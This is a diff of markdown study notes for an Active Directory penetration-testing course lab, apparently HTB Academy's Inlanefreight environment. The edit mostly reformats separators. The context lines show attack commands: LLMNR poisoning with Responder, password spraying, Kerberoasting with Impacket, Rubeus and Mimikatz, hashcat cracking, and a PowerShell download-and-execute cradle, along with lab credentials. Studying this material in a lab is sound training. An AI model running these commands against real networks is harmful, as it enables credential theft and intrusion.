@@ -5,8 +5,6 @@
 2. **Scope Assurance:** Avoid unintended interactions with systems outside the authorized scope.
 3. **Information Gathering:** Identify publicly available data that could facilitate the penetration test, like leaked credentials or infrastructure details.
 
----
-
 ### What to Look For:
 
 | **Data Point**      | **Description**                                                                                                   |
@@ -16,8 +14,6 @@
 | **Schema Format**    | Email/AD username conventions and password policies for attacks like password spraying or credential stuffing.    |
 | **Data Disclosures** | Metadata in public documents, links to intranet, or credentials in repositories like GitHub.                     |
 | **Breach Data**      | Publicly leaked usernames, passwords, or hashes for unauthorized access to services.                             |
-
----
 
 ### Where to Look:
 
@@ -29,8 +25,6 @@
 | **Public Websites**        | Check the "About Us" and "Contact Us" pages for embedded documents, emails, and organizational charts.     |
 | **Cloud & Dev Repos**      | GitHub, AWS S3 buckets, and Google Dorks for accidentally exposed credentials or sensitive files.          |
 | **Breach Sources**         | HaveIBeenPwned, Dehashed to find corporate emails, plaintext passwords, or hashes in breach databases.     |
-
----
 
 ### Steps and Tools:
 
@@ -65,8 +59,6 @@
      ```
      
 
----
-
 ### Key Enumeration Principles:
 
 1. **Passive to Active Approach:** Begin with passive recon (no direct engagement) and gradually move to active enumeration once you identify potential targets.
@@ -80,13 +72,11 @@ This methodology ensures thorough preparation and minimizes the risk of errors d
 ![image](https://github.com/user-attachments/assets/b35654f9-5fa7-4dba-8cbf-c916eb17b67b)
 
 
----
-
 
 #### Setting Up
 For this penetration test, we are starting on an attack host within the internal network of Inlanefreight. The customer has provided a **custom pentest VM** connected to their internal network, and we are to perform non-evasive testing starting from an unauthenticated standpoint with a **standard domain user account (htb-student)**.
 
----
+
 
 #### Tasks:
 1. **Enumerate the internal network** to identify hosts, services, and potential vulnerabilities.
@@ -97,7 +87,7 @@ For this penetration test, we are starting on an attack host within the internal
    - Key Services (Kerberos, NetBIOS, LDAP, DNS)
    - Vulnerable Hosts and Services
 
----
+
 
 ### 1. Identifying Hosts (Passive Enumeration)
 
@@ -115,7 +105,7 @@ sudo -E wireshark
 - `172.16.5.100`
 - `172.16.5.125`
 
----
+
 
 #### **Tcpdump Capture**
 If you are on a host without a GUI, you can use `tcpdump` to capture network traffic and save it to a `.pcap` file for later analysis with Wireshark.
@@ -124,7 +114,7 @@ If you are on a host without a GUI, you can use `tcpdump` to capture network tra
 sudo tcpdump -i ens224
 ```
 
----
+
 
 #### **Responder Analysis**
 Responder can be used in passive mode to listen for LLMNR, NBT-NS, and MDNS requests, identifying additional hosts.
@@ -136,7 +126,7 @@ sudo responder -I ens224 -A
 *Responder output reveals:*
 - New hosts: `172.16.5.200`, `172.16.5.225`, `ACADEMY-EA-WEB01`
 
----
+
 
 ### 2. Active Enumeration of Hosts
 
@@ -149,7 +139,7 @@ fping -asgq 172.16.5.0/23
 
 *Results show 9 live hosts including the attack host.*
 
----
+
 
 ### 3. Nmap Scan of Active Hosts
 
@@ -166,7 +156,7 @@ sudo nmap -v -A -iL hosts.txt -oN /home/htb-student/Documents/host-enum
 - **445/tcp**: Microsoft-DS
 - **636/tcp**: SSL/LDAP
 
----
+
 
 ### 4. Key Data Points Collected:
 - **AD Users**: To target for password spraying or further enumeration.
@@ -174,7 +164,7 @@ sudo nmap -v -A -iL hosts.txt -oN /home/htb-student/Documents/host-enum
 - **Key Services**: Identified Kerberos, LDAP, DNS, SMB services.
 - **Vulnerable Hosts**: Noticed open ports and services that might be exploitable.
 
---- 
+
 ## Identifying Users for Internal Penetration Testing
 
 When no user is provided to start testing with, the goal is to establish a foothold in the domain using various techniques. The most common methods for obtaining access are:
@@ -244,9 +234,6 @@ kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_
 ### Considerations for Stealth
 - **Non-evasive tests**: Higher noise and less concern for stealth.
 - **Evasive or red team engagements**: Stealth is critical. Using tools like **Nmap** or other noisy tools may trigger alerts. Always clarify the assessment's goals with the client.
-
-Sure thing! Here is a more detailed version, including commands and additional information:
-
 ---
 
 # LLMNR/NBT-NS Poisoning from Linux
@@ -401,7 +388,6 @@ IP Address    Host            Username                     Challenge
 ...
 ```
 
----
 
 ## Remediation
 
@@ -498,7 +484,7 @@ To prevent LLMNR and NBT-NS spoofing attacks, it's crucial to disable these prot
 - **Delays:** Wait hours between attempts.
 - **Client Communication:** Clarify password policies.
 - **Enumeration:** Use provided accounts to discover password policies.
-
+---
 # Enumerating & Retrieving Password Policies
 
 In various IT security scenarios, enumerating and retrieving password policies are essential steps to understand and secure the domain environment. This process can vary depending on whether you have valid credentials or are attempting to access information without authentication.
@@ -620,7 +606,7 @@ net accounts
 - **Password history size:** 24.
 
 if password policy is not retrieved rule of thumb is max tries is 3-5 and make sure not to lockout accounts.
-
+---
 # Password Spraying - Making a Target User List
 
 ## Detailed User Enumeration
@@ -705,7 +691,7 @@ With valid credentials, use any of the tools stated previously to build a user l
 # Using CrackMapExec with Valid Credentials
 sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
 ```
-
+---
 # Internal Password Spraying - from Linux
 
 ## Overview
@@ -785,7 +771,7 @@ SMB 172.16.5.125 445 ACADEMY-EA-WEB0 [+] ACADEMY-EA-WEB0\administrator 88ad09182
 - Highlight this issue during penetration tests, even if it is not part of the path to compromise the domain.
 - Use the free Microsoft tool Local Administrator Password Solution (LAPS) to manage local administrator passwords and enforce unique passwords on each host that rotate on a set interval.
 
-
+---
 # Internal Password Spraying - from Windows
 
 ## Using DomainPasswordSpray.ps1
@@ -871,12 +857,10 @@ RealTimeProtectionEnabled parameter is set to True, which means Defender is enab
 ## Importance
 - **Understand Protections**: Knowing the security controls helps avoid or modify tools and plan actions effectively.
 - **Target Specific Users**: Identify AD users who can read LAPS passwords for targeted actions.
-
+---
 # Credentialed Enumeration From Linux 
 
 Credentialed enumeration involves leveraging valid domain user credentials to gather detailed information about domain users, groups, permissions, and shares. Below are step-by-step notes and commands for conducting such enumeration.
-
----
 
 #### **1. Setting Up**
 - **Credentials**: User `forend` with password `Klmcargo2`.
@@ -884,7 +868,7 @@ Credentialed enumeration involves leveraging valid domain user credentials to ga
 - Commands should be prefaced with `sudo` when necessary.
 - **Linux Host**: Use tools installed on `ATTACK01` Parrot Linux.
 
----
+
 
 ### **Using CrackMapExec (CME)**
 
@@ -923,7 +907,7 @@ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share '
 ```
 - **Output**: Crawls through a specific share (e.g., `Department Shares`) and saves results in JSON format at `/tmp/cme_spider_plus/<ip of host>.json`.
 
----
+
 
 ### **Using SMBMap**
 
@@ -944,7 +928,7 @@ smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Departmen
 ```
 - **Output**: Lists all subdirectories in the `Department Shares`.
 
----
+
 
 
 ### **Using rpcclient**
@@ -976,7 +960,6 @@ rpcclient $> queryuser [RID]
 - Domain SID: `S-1-5-21-<unique domain identifier>`.
 - User SID: Combines Domain SID with RID (e.g., `S-1-5-21-<unique domain ID>-1111`).
 
----
 
 ### **Using Impacket Toolkit**
 
@@ -1003,7 +986,7 @@ rpcclient $> queryuser [RID]
   wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5
   ```
  this shell environment is not fully interactive, so each command issued will execute a new cmd.exe from WMI and execute your command. The downside of this is that if a vigilant defender checks event logs and looks at event ID 4688: A new process has been created, they will see a new process created to spawn cmd.exe and issue a command.
----
+
 
 ### **Using Windapsearch**
 `windapsearch.py` performs LDAP queries to enumerate AD information.
@@ -1025,7 +1008,7 @@ python3 /opt/windapsearch/windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefre
 ```
 - **Output**: Identifies privileged users, including those with nested group membership.
 
----
+
 
 ### **Tips for Effective Enumeration**
 - **Save Outputs**: Redirect results to files for better analysis.
@@ -1117,19 +1100,17 @@ ls
 - **Database Info Tab**: View detailed information about the database.
 - **Node Info Tab**: Search for specific nodes like Domain Users.
 - **Settings Menu**: Adjust how nodes and edges are displayed, enable query debug mode, and enable dark mode.
-
+---
 # Living OFF the Land
 
 When traditional methods fail, "living off the land" utilizes native Windows tools and commands for stealthier enumeration. This approach minimizes log entries, reduces the chance of detection by monitoring tools, and aligns with scenarios where uploading external tools isn't feasible.
-
----
 
 ### **Scenario**
 - Client request: Test AD environment from a managed host with no internet and no external tool uploads.
 - Goal: Identify possible enumeration activities using only built-in tools, avoiding alerts from monitoring systems such as IDS/IPS or enterprise EDR.
 - Strategy: Use native Windows utilities to explore the host and network configurations, maintain stealth, and minimize defender-triggered responses.
 
----
+
 
 ### **Host and Network Recon: Key Commands**
 
@@ -1145,7 +1126,6 @@ When traditional methods fail, "living off the land" utilizes native Windows too
 | `echo %logonserver%`                      | Shows the name of the domain controller the host checks in with.                             |
 | `systeminfo`                              | Provides a summary of host information in one tidy output (e.g., OS, domain, network details).|
 
----
 
 ### **Harnessing PowerShell for Advanced Recon**
 PowerShell offers extensive capabilities for system and network reconnaissance.
@@ -1160,7 +1140,7 @@ PowerShell offers extensive capabilities for system and network reconnaissance.
 | `Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt` | Retrieves PowerShell history for potential insights (e.g., scripts or passwords).               |
 | `powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL'); <commands>"` | Downloads and executes content directly in memory (if internet access is available).            |
 
----
+
 
 ### **Downgrading PowerShell for Stealth**
 - **Rationale**: Versions prior to PowerShell 3.0 lack advanced logging features, such as Script Block Logging.
@@ -1172,7 +1152,7 @@ PowerShell offers extensive capabilities for system and network reconnaissance.
 #### **Caveat**:
 - Actions to downgrade (e.g., `powershell.exe -version 2`) are logged, but subsequent activity in version 2.0 is not.
 
----
+
 
 ### **Checking Host Defenses**
 #### **Firewall Configuration**
@@ -1190,7 +1170,7 @@ PowerShell offers extensive capabilities for system and network reconnaissance.
    - `Get-MpComputerStatus`  
    - Displays detailed Defender settings (e.g., real-time protection, signature versions, scanning schedules).
 
----
+
 
 ### **Am I Alone?**
 - **Command**: `qwinsta`
@@ -1199,7 +1179,6 @@ PowerShell offers extensive capabilities for system and network reconnaissance.
   - `SESSIONNAME`: Console or remote session type.
   - `USERNAME`: Active user(s).
 
----
 
 ### **Network Enumeration**
 #### **Key Networking Commands**
@@ -1218,14 +1197,14 @@ PowerShell offers extensive capabilities for system and network reconnaissance.
   - Reveals known networks and possible lateral movement paths.
   - Persistent routes can indicate administratively-set paths or frequent access points.
 
----
+
 
 ### **Windows Management Instrumentation (WMI) and Domain Enumeration Techniques**
 
 #### **WMI Overview**
 WMI is a powerful scripting engine used in Windows environments for administrative tasks and information retrieval. It enables local and remote queries about users, groups, processes, and system configurations, making it invaluable for enumeration tasks.
 
----
+
 
 ### **WMI Commands**
 | **Command** | **Description** |
@@ -1238,7 +1217,7 @@ WMI is a powerful scripting engine used in Windows environments for administrati
 | `wmic group list /format:list` | Lists local groups. |
 | `wmic sysaccount list /format:list` | Dumps service account information. |
 
----
+
 
 ### **Net Commands**
 Net commands provide information about users, groups, and domain settings. They are versatile but may trigger alerts in monitored environments.
@@ -1258,7 +1237,6 @@ Net commands provide information about users, groups, and domain settings. They 
 #### **Key Notes**:
 - Use `net1` as a stealthy alternative to `net` commands in monitored environments.
 
----
 
 ### **Dsquery Commands**
 `dsquery` enables Active Directory (AD) object searches. It's available on hosts with the AD Domain Services role and uses built-in DLLs.
@@ -1288,7 +1266,7 @@ Net commands provide information about users, groups, and domain settings. They 
 - Exclude users with **Password Can't Change**:  
   `(&(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=64))`
 
----
+
 ### **UserAccountControl (UAC) Values and Their Corresponding Attributes**
 
 The **UserAccountControl (UAC)** attribute in Active Directory defines specific properties of user accounts. These properties are stored as a bitmask, and each value corresponds to a particular attribute. The values can combine to represent multiple attributes simultaneously.
@@ -1311,18 +1289,17 @@ The **UserAccountControl (UAC)** attribute in Active Directory defines specific 
 | `524288`  | **NOT_DELEGATED**                                     | The account cannot be delegated.                                                                 |
 | `1048576` | **USE_DES_KEY_ONLY**                                  | The account is restricted to use only DES encryption types for keys.                             |
 
----
+
 
 ### **Combining UAC Values**
 - UAC values can combine to represent multiple properties. For example:
   - A disabled account (`2`) that does not require a password (`32`) would have a UAC value of `34` (`2 + 32`).
-
+---
 # Kerberoasting from Linux:
 
 #### **Overview**
 Kerberoasting is a **lateral movement and privilege escalation technique** targeting Service Principal Names (SPNs) in Active Directory (AD). SPNs link services to service accounts, often requiring domain credentials for authentication. By requesting Kerberos service tickets (TGS-REPs), attackers can extract encrypted ticket data offline to attempt brute-force password cracking.
 
----
 
 ### **Core Concepts**
 1. **SPNs and Their Role in Kerberos**:
@@ -1343,7 +1320,7 @@ Kerberoasting is a **lateral movement and privilege escalation technique** targe
    - **High Impact**: Privileged accounts like `Domain Admins` compromised.
    - **Low Impact**: Cracked passwords grant limited access but may help pivot within the domain.
 
----
+
 
 ### **Key Tools for Kerberoasting from Linux**
 1. **Impacket Toolkit**:
@@ -1357,7 +1334,6 @@ Kerberoasting is a **lateral movement and privilege escalation technique** targe
    - `crackmapexec`: Validate cracked credentials.
    - `rockyou.txt` or other password wordlists for brute-force attacks.
 
----
 
 ### **Steps for Performing Kerberoasting on Linux**
 
@@ -1367,7 +1343,7 @@ Kerberoasting is a **lateral movement and privilege escalation technique** targe
 ```
 - Installs Impacket's tools in the system's PATH for easy access.
 
----
+
 
 #### **2. Enumerate SPNs with Valid Credentials**
 Command:
@@ -1398,7 +1374,7 @@ Command:
  GetUserSPNs.py -dc-ip <DC-IP> <DOMAIN>/<USERNAME> -request -outputfile <FILE>
 ```
 
----
+
 
 #### **5. Crack TGS Tickets with Hashcat**
 Command:
@@ -1411,7 +1387,7 @@ Example Cracked Password:
 $krb5tgs$23$...:database!
 ```
 
----
+
 
 #### **6. Test Access with Cracked Credentials**
 Command:
@@ -1430,7 +1406,7 @@ SMB         172.16.5.5      445    <DC_NAME>  [+] <DOMAIN>\<USERNAME>:<PASSWORD>
 
 Kerberoasting is a post-exploitation technique used to extract and crack Kerberos tickets for sensitive service accounts in a Windows domain. Below is a detailed guide, providing both context and explanations for the commands involved in semi-manual and automated approaches.
 
----
+
 
 ### **1. Overview of Kerberoasting**
 - **Purpose**: 
@@ -1440,13 +1416,12 @@ Kerberoasting is a post-exploitation technique used to extract and crack Kerbero
   - A foothold in the target domain (valid credentials for a domain account).
   - Permission to request TGS tickets, which any authenticated domain user typically has.
 
----
 
 ### **2. Semi-Manual Method for Kerberoasting**
 
 This approach is helpful when automated tools are unavailable or blocked. It combines built-in Windows tools and manual extraction methods.
 
----
+
 
 #### **Step 1: Enumerate Service Principal Names (SPNs)**
 - Use `setspn.exe` (a built-in Windows binary) to query the domain for SPNs.
@@ -1460,7 +1435,6 @@ This approach is helpful when automated tools are unavailable or blocked. It com
   - SPNs are unique identifiers for services running under specific accounts (e.g., `MSSQLSvc`, `backupjob`).
   - Output includes **user accounts** and **computer accounts**. Focus on user accounts as these can have weak passwords.
 
----
 
 #### **Step 2: Request TGS Tickets Using PowerShell**
 - Request a TGS ticket for a specific SPN.
@@ -1477,7 +1451,6 @@ This approach is helpful when automated tools are unavailable or blocked. It com
      - Creates a `KerberosRequestorSecurityToken` object, requesting a TGS ticket for the specified SPN (`MSSQLSvc/DEV-PRE-SQL`).
      - The ticket is loaded into memory for further processing.
 
----
 
 #### **Step 3: Extract Tickets from Memory with Mimikatz**
 - Dump the loaded TGS tickets using Mimikatz.
@@ -1491,7 +1464,7 @@ mimikatz # kerberos::list /export
   - The `/export` flag saves each ticket as a `.kirbi` file on disk.
   - These `.kirbi` files are encrypted but can be cracked offline.
 
----
+
 
 #### **Step 4: Prepare Tickets for Cracking**
 1. **Convert Base64-Encoded Tickets to .kirbi**:
@@ -1523,13 +1496,13 @@ mimikatz # kerberos::list /export
   - **`-m 13100`**: Hashcat mode for cracking Kerberos 5 TGS-REP hashes using RC4 encryption.
   - **Wordlist**: A file like `rockyou.txt` is used for dictionary-based brute-forcing.
 
----
+
 
 ### **3. Automated Methods for Kerberoasting**
 
 Automated tools simplify Kerberoasting by combining enumeration, ticket requests, and hash extraction into fewer steps.
 
----
+
 
 #### **Using PowerView**
 1. **Import PowerView Module**:
@@ -1556,7 +1529,7 @@ Automated tools simplify Kerberoasting by combining enumeration, ticket requests
     Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
    ```
 
----
+
 
 #### **Using Rubeus**
 1. **Basic Kerberoasting**:
@@ -1584,7 +1557,7 @@ Automated tools simplify Kerberoasting by combining enumeration, ticket requests
    ```powershell
     .\Rubeus.exe kerberoast /stats
    ```
----
+
 
 ### **1. Encryption Types in Kerberoasting**
 
@@ -1605,7 +1578,7 @@ Automated tools simplify Kerberoasting by combining enumeration, ticket requests
   - **msds-supportedencryptiontypes = 0**: Defaults to RC4 encryption.
   - **msds-supportedencryptiontypes = 24**: Supports AES-128/256 encryption only.
 
----
+
 
 ### **2. Key Commands for Kerberoasting**
 
@@ -1637,7 +1610,6 @@ hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt
 hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt
 ```
 
----
 
 ### **4. Downgrading to RC4 Encryption**
 - Use Rubeus to force RC4 encryption for accounts that support AES:
@@ -1665,7 +1637,7 @@ PS C:\htb> .\Rubeus.exe kerberoast /user:testspn /tgtdeleg /nowrap
 - **User Information**:
   - Logs may show the attacker (e.g., `htb-student`) requesting tickets for target accounts (e.g., `sqldev`).
 
----
+
 
 #### **Mitigation Strategies**
 1. **Strong Passwords**:
@@ -1734,4 +1706,5 @@ ACL misconfigurations can be exploited for:
 - **BloodHound**: Visualizes and enumerates ACL permissions to identify exploitable misconfigurations.
 - **PowerView**: A PowerShell tool that helps enumerate and exploit AD ACLs.
 
+---
 
